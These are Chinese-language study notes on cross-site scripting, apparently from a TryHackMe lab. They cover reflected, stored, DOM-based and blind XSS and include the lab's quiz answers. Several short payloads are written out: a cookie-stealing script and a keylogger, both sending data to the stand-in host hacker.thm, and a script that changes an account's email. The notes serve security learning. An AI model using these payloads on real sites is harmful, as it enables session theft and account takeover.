# task1
XSS 是基於 JavaScript 
```
Cross-Site Scripting
```
# task2
最簡單的概念證明：
```
<script>alert('XSS');</script>
```
會話竊取： JavaScript 獲取目標的 cookie，base64 對 cookie 進行編碼以確保傳輸成功，然後將其發佈到黑客控制的網站進行登錄。一旦黑客擁有了這些 cookie，他們就可以接管目標的會話並以該用戶的身份登錄。
```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```
按鍵記錄器：
在網頁上鍵入的任何內容都將被轉發到黑客控制下的網站
```
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

## 商業邏輯：
調用特定的網絡資源或 JavaScript 函數。例如，想像一個用於更改用戶電子郵件地址的 JavaScript 函數，名為user.changeEmail(). 您的有效載荷可能如下所示：
```
<script>user.changeEmail('attacker@hacker.thm');</script>
```
現在帳戶的電子郵件地址已更改，攻擊者可能會執行重置密碼攻擊。
```
哪個文檔屬性可以包含用戶的會話令牌？
document.cookie

哪種 JavaScript 方法經常被用作概念證明？
alert
```
# task3
## 反射型 XSS
用戶提供的數據未經任何驗證包含在網頁源中時，就會發生反射型 XSS

您需要測試每個可能的入口點；這些包括：    

URL 查詢字符串中的參數    
URL 文件路徑    
有時HTTP標頭（儘管在實踐中不太可能被利用）    

**在參數中測試，看能不能插入惡意的js**

# task4
## 存儲型 XSS
`XSS 有效負載存儲在 Web 應用程序中（例如，在數據庫中），然後在其他用戶訪問該站點或網頁時運行。`

```
沒有檢查這些評論是否包含 JavaScript 或過濾掉任何惡意代碼。如果我們現在發布包含 JavaScript 的評論，這將存儲在數據庫中，並且現在訪問該文章的每個其他用戶都將在他們的瀏覽器中運行 JavaScript。
```

```
如何測試存儲型 XSS：

您需要測試似乎存儲數據的每個可能的入口點，然後在其他用戶可以訪問的區域中顯示出來；其中一個小例子可能是：

對博客的評論
用戶個人資料信息
網站列表
```

潛在影響：

惡意 JavaScript 可能會將用戶重定向到另一個站點、竊取用戶的會話 cookie 或在充當訪問用戶時執行其他網站操作。



# task5
## 基於 DOM 的 XSS
## DOM?  
 DOM代表文檔對像模型，是HTML和 XML 文檔的編程接口。它表示頁面，以便程序可以更改文檔結構、樣式和內容。網頁是一個文檔，該文檔既可以顯示在瀏覽器窗口中，也可以作為 HTML 源文件顯示

 ```
 DOM 的 XSS 可能難以測試，並且需要一定的 JavaScript 知識才能閱讀源代碼。您需要查找訪問攻擊者可以控制的某些變量的代碼部分，例如“ window.location.x ”參數。
 ```
## 利用 DOM

基於 DOM 的 XSS 是 JavaScript 直接在瀏覽器中執行的地方，無需加載任何新頁面或將數據提交給後端代碼。當網站 JavaScript 代碼作用於輸入或用戶交互時，執行發生。


## 示例場景：

網站的 JavaScript 從window.location.hash 參數中獲取內容，然後將其寫入當前正在查看的頁面中的部分。哈希的內容不會檢查惡意代碼，從而允許攻擊者將他們選擇的 JavaScript 注入網頁。

```
當您找到這些代碼時，您需要查看它們是如何處理的，以及這些值是否曾經寫入網頁的 DOM 或傳遞給不安全的 JavaScript 方法，例如eval()。
 ```

# task6
## 盲XSS
盲 XSS 類似於存儲型 XSS  
看不到有效負載工作。
```
示例場景：

一個網站有一個聯繫表格，您可以在其中向工作人員發送消息。消息內容不會被檢查任何惡意代碼，這允許攻擊者輸入他們想要的任何內容。然後，這些消息會變成支持票，員工可以在私人門戶網站上查看。

潛在影響：

使用正確的有效負載，攻擊者的 JavaScript 可以調用攻擊者的網站，顯示員工門戶 URL、員工的 cookie，甚至正在查看的門戶頁面的內容。現在，攻擊者可能會劫持員工的會話並訪問私人門戶。
如何測試盲 XSS：



在測試盲 XSS 漏洞時，您需要確保您的有效負載具有回調（通常是HTTP請求）。這樣，您就知道您的代碼是否以及何時執行。



用於盲 XSS 攻擊的流行工具是xsshunter。儘管可以使用 JavaScript 製作您自己的工具，但該工具會自動捕獲 cookie、URL、頁面內容等。

回答以下問題

你可以使用什麼工具來測試 Blind XSS？
xsshunter

什麼類型的 XSS 與 Blind XSS 非常相似？
stored xss
```


